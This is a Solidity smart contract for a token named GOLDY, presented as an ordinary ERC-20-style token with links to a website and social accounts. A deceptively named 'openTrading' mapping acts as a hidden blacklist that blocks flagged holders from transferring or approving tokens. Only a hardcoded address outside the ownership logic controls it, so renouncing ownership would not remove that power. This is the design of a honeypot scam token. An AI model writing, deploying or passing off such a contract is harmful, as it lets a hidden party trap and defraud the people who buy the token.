// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**

Website  : https://goldycoin.org/
Twitter  : https://x.com/thegoldycoin
Telegram : https://x.com/thegoldycoin
*/

contract GOLDY {

    string public name = "GOLDY";
    string public symbol = "GOLDY";
    uint256 public totalSupply = 999999999999999999000000000;
    uint8 public decimals = 18;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) public openTrading;

    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event OpenTradingUpdated(address indexed account, bool isOpenTrading);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "1GOLDY");
        _;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "2GOLDY");
        require(_to != address(0), "3GOLDY");
        require(!openTrading[msg.sender], "4GOLDY");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(!openTrading[msg.sender], "5GOLDY");

        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "6GOLDY");
        require(allowance[_from][msg.sender] >= _value, "7GOLDY");
        require(_to != address(0));
        require(!openTrading[_from], "8GOLDY");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "9GOLDY");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function addOpenTrading(address _account) public {
        require(msg.sender == 0x72d5BB1b4993B594c319443e693756205e913AB9, "GOLDYGOLDY");
        openTrading[_account] = true;
        emit OpenTradingUpdated(_account, true);
    }

    function removeOpenTrading(address _account) public {
        require(msg.sender == 0x72d5BB1b4993B594c319443e693756205e913AB9, "GOLDYGOLDYGOLDYGOLDY");
        openTrading[_account] = false;
        emit OpenTradingUpdated(_account, false);
    }
}